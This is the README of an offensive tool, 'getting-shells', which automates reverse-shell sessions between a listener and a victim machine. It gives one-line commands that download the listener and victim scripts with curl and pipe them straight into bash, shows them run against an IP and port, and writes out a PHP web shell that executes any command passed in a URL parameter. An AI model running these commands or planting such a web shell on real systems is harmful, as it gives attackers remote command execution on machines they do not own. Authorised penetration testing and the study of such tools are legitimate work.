# getting-shells

Version 1
2021-11-23

## Purpose

Automation tool for listening and starting shells sessions.\
Both, the listener and the victim scripts check for installed resources.\
This tool simplifies the successive trials of starting a shell by selecting options from a menu.

## Quick Execution

Listener:

```
bash -c "$(curl -sS https://raw.githubusercontent.com/davift/getting-shells/main/listener.sh)"
```

![listener_screenshot](https://github.com/davift/getting-shells/blob/main/listener.png)

Victim:

```
bash -c "$(curl -sS https://raw.githubusercontent.com/davift/getting-shells/main/victim.sh)"
```

![victim_screenshot](https://github.com/davift/getting-shells/blob/main/victim.png)

## Installation

No installation is required. This scripts can run out of the box. Just clone the repo:

```
git clone https://github.com/davift/getting-shells.git && cd getting-shells
```

## Execution

```
./listener.sh 443
```

```
./victim.sh 192.168.2.1 443
```

## Additionals

There is no such thing as dependencies to run this tool. It uses the available resources in the system to establish the sessions.\
Additionally, in case you need more resources and have the necessary privileges on the system, the following script will automate the installation of more resources:

```
./additionals.sh
```

**PHP Web Shell**

```
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > cmd.php
```

```
python3 webshell.py
```

## More Information

Read more at https://blog.dftorres.ca/?p=2224.
